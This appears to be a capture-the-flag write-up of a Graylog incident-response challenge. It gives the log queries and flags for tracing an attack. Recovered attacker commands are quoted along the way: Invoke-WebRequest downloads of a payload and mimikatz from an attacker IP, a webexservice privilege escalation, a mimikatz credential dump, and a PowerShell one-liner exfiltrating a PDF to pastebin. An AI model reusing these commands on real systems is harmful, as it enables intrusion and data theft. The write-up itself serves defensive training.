# 2. Secondary Objectives
## 2.8. Graylog
### 2.8.1. Description
Speaking with Pepper Minstix:
>It's me - Pepper Minstix. Normally I'm jollier, but this Graylog has me a bit mystified. Have you used Graylog before? It is a log management system based on Elasticsearch, MongoDB, and Scala. Some Elf U computers were hacked, and I've been tasked with performing incident response. Can you help me fill out the incident response report using our instance of Graylog? It's probably helpful if you know a few things about Graylog. Event IDs and Sysmon are important too. Have you spent time with those? Don't worry - I'm sure you can figure this all out for me! Click on the All messages Link to access the Graylog search interface! Make sure you are searching in all messages! The Elf U Graylog server has an integrated incident response reporting system. Just mouse-over the box in the lower-right corner. Login with the username elfustudent and password elfustudent. 
### 2.8.2. Question #1
#### 2.8.2.1. Description
Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.

What is the full-path + filename of the first malicious file downloaded by Minty?
#### 2.8.2.2. Solution
Below search was used to get all TargetFilenames related to minty:
```
minty AND TargetFilename:/.{1,}/
```
The search returned 18 elements among which C:\Users\minty\Downloads\cookie_recipe.exe.
#### 2.8.2.3. Flag
The flag is: **C:\Users\minty\Downloads\cookie_recipe.exe**.
#### 2.8.2.4. Afterwords
We can find this searching for sysmon file creation event id 2 with a process named firefox.exe and not junk .temp files. We can use regular expressions to include or exclude patterns:
TargetFilename:/.+\.pdf/
### 2.8.3. Question #2
#### 2.8.3.1. Description
The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the ip:port the malicious file connected to first?
#### 2.8.3.2. Solution
Below search was used to get all network connection related to cookie_recipe.exe:
```
cookie_recipe.exe AND EventID:3
```
The search returned 1 element among with DestinationIp 192.168.247.175 and DestinationPort 4444.
#### 2.8.3.3. Flag
The flag is: **192.168.247.175:4444**.
#### 2.8.3.4. Afterwords
We can pivot off the answer to our first question using the binary path as our ProcessImage.
### 2.8.4. Question #3
#### 2.8.4.1. Description
What was the first command executed by the attacker?

(answer is a single word)
#### 2.8.4.2. Solution
Knowing the PID of cookie_recipe.exe and assuming that every command execution spawns a new process, it was possible to filter on new process creations with parent 5256:
```
EventID:1 AND ParentProcessId:5256
```
After sorting by timestamp, the first result is the execution of `C:\Windows\system32\cmd.exe /c "whoami "`.
#### 2.8.4.3. Flag
The flag is: **whoami**.
#### 2.8.4.4. Afterwords
Since all commands (sysmon event id 1) by the attacker are initially running through the cookie_recipe.exe binary, we can set its full-path as our ParentProcessImage to find child processes it creates sorting on timestamp.
### 2.8.5. Question #4
#### 2.8.5.1. Description
What is the one-word service name the attacker used to escalate privileges?
#### 2.8.5.2. Solution
With results from previous query it was possible to see the attacker downloaded a second stage with `C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri http://192.168.247.175/cookie_recipe2.exe -OutFile cookie_recipe2.exe "` and then execute it with `C:\Windows\system32\cmd.exe /c "sc start webexservice a software-update 1 wmic process call create "cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe" "`.
#### 2.8.5.3. Flag
The flag is: **webexservice**.
#### 2.8.5.4. Afterwords
Continuing on using the cookie_reciper.exe binary as our ParentProcessImage, we should see some more commands later on related to a service.
### 2.8.6. Question #5
#### 2.8.6.1. Description
What is the file-path + filename of the binary ran by the attacker to dump credentials?
#### 2.8.6.2. Solution
Below search pivots on the cookie_recipe2.exe file:
```
ParentProcessImage:"C:\\Users\\minty\\Downloads\\cookie_recipe2.exe"
```
One of the logs highlights the download of mimikatz with command `C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri http://192.168.247.175/mimikatz.exe -OutFile C:\cookie.exe "`.
Below search focuses on C:\cookie.exe related executions:
```
ProcessImage:"C:\\cookie.exe"
```
It is possible to notice its execution as `"C:\cookie.exe" privilege::debug sekurlsa::logonpasswords exit` thus recognizing common mimkatz parameters.
#### 2.8.6.3. Flag
The flag is: **C:\cookie.exe**.
#### 2.8.6.4. Afterwords
The attacker elevates privileges using the vulnerable webexservice to run a file called cookie_recipe2.exe. Let's use this binary path in our ParentProcessImage search.
### 2.8.7. Question #6
#### 2.8.7.1. Description
The attacker pivoted to another workstation using credentials gained from Minty's computer. Which account name was used to pivot to another machine?
#### 2.8.7.2. Solution
Using below search it is possible to verify to which IPs the compromised machine connected to:
```
EventID:3 AND SourceHostname:DEFANELF
```
With this search it is possible to see that it connected to ports 135 (RPC), 445 (SMB), 3389 (RDP) and 49672. As RDP and SMB are protocols commonly used during lateral movements but RDP leaves traces in the WinEvent logs, I started pivoting from it with search:
```
EventID:4624 AND SourceHostName:DEFANELF
```
The search returned 14 messages, all mentioning alabaster as AccountName.
#### 2.8.7.3. Flag
The flag is: **alabaster**.
#### 2.8.7.4. Afterwords
Windows Event Id 4624 is generated when a user network logon occurs successfully. We can also filter on the attacker's IP using SourceNetworkAddress. 
### 2.8.8. Question #7
#### 2.8.8.1. Description
What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?
#### 2.8.8.2. Solution
Adding filter for successful network logons to the previous query provides the search:
```
EventID:4624 AND LogonType:10
```
Returns 1 event that identifies the login to the machine with user NORTHPOLE\alabaster at 2019-11-19 06:04:28.000 +00:00.
#### 2.8.8.3. Flag
The flag is: **06:04:28**.
#### 2.8.8.4. Afterwords
LogonType 10 is used for successful network connections using the RDP client.
### 2.8.9. Question #8
#### 2.8.9.1. Description
The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection?

(submit in that order as csv)
#### 2.8.9.2. Solution
Knowing that LogonType 10 were already identified, I tried focusing on other potentialy interesting logon types from DEFANELF, the originally compromised machine, and elfu-res-wks2, the second one. After just too much time spent understanding that I should search for the SourceHostName in all capitals, i ended up using search:
```
EventID:4624 AND NOT LogonType:10 AND (SourceHostName:(DEFANELF OR ELFU-RES-WKS2) AND NOT DestinationHostname:(DEFANELF OR elfu-res-wks2))
```
This returns 8 events that identifies logins via SMB to elfu-res-wks3 and elfu-res-wks1.
#### 2.8.9.3. Flag
The flag is: **elfu-res-wks2,elfu-res-wks3,3**.
#### 2.8.9.4. Afterwords
The attacker has GUI access to workstation 2 via RDP. They likely use this GUI connection to access the file system of of workstation 3 using explorer.exe via UNC file paths (which is why we don't see any cmd.exe or powershell.exe process creates). However, we still see the successful network authentication for this with event id 4624 and logon type 3.
### 2.8.10. Question #9
#### 2.8.10.1. Description
What is the full-path + filename of the secret research document after being transferred from the third host to the second host?
#### 2.8.10.2. Solution
Knowing that there was a connection between host 3, elfu-res-wks3, and host 2, elfu-res-wks2, searching for connection between them would narrow time frames:
```
EventID:3 AND ((SourceHostname:elfu-res-wks3 AND DestinationHostname:elfu-res-wks2) OR (SourceHostname:elfu-res-wks2 AND DestinationHostname:elfu-res-wks3))
```
Using this search allows to get 3 results at 2019-11-19 05:58:28.000, 2019-11-19 05:58:29.000 and 2019-11-19 05:58:29.000.

Starting to arrange timeframes searching for file creations on host 2 while excluding uninteresting folders led to 1 event between 2019-11-19 05:58:28 and 2019-11-19 06:10:00 with search:
```
EventID:2 AND source:elfu-res-wks2 AND NOT TargetFilename:(/.*ProgramData.*/ OR /.*SoftwareDistribution.*/ OR /.*AppData.*/)
```
This event shows the creation of a file named C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf from C:\Windows\Explorer.EXE thus also confirming the exfiltration via SMB.
#### 2.8.10.3. Flag
The flag is: **C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf**.
#### 2.8.10.4. Afterwords
We can look for sysmon file creation event id of 2 with a source of workstation 2. We can also use regex to filter out overly common file paths using something like:
AND NOT TargetFilename:/.+AppData.+/
### 2.8.11. Question #10
#### 2.8.11.1. Description
What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?
#### 2.8.11.2. Solution
It is possible to search for the filename that was saved on host 2 to see if it was involved in other events with query:
```
"C:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf"
```
Even with such a generic query only two results comes up of which one is the process creation for powershell with command line `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -Uri https://pastebin.com/post.php -Method POST -Body @{ "submit_hidden" = "submit_hidden"; "paste_code" = $([Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf"))); "paste_format" = "1"; "paste_expire_date" = "N"; "paste_private" = "0"; "paste_name"="cookie recipe" }` thus highlighting that the file was exfiltrated to pastebin.com from PID 1232.

It is possible to verify network events related to this PID with query:
```
EventID:3 AND ProcessId:1232
```
Only one event shows up in the logs, confirming the destination hostname and providing the destination IP 104.22.3.84.
#### 2.8.11.3. Flag
The flag is: **104.22.3.84**.
#### 2.8.11.4. Afterwords
We can look for the original document in CommandLine using regex.
When we do that, we see a long a long PowerShell command using Invoke-Webrequest to a remote URL of https://pastebin.com/post.php.
We can pivot off of this information to look for a sysmon network connection id of 3 with a source of elfu-res-wks2 and DestinationHostname of pastebin.com.
### 2.8.12. Afterwords
In the graylog web ui:
>Incident Response Report #7830984301576234 Submitted.
>Incident Fully Detected!

Speaking again with Pepper Minstix:
>That's it - hooray! Have you had any luck retrieving scraps of paper from the Elf U server? You might want to look into SQL injection techniques. OWASP is always a good resource for web attacks. For blind SQLi, I've heard Sqlmap is a great tool. In certain circumstances though, you need custom tamper scripts to get things going!
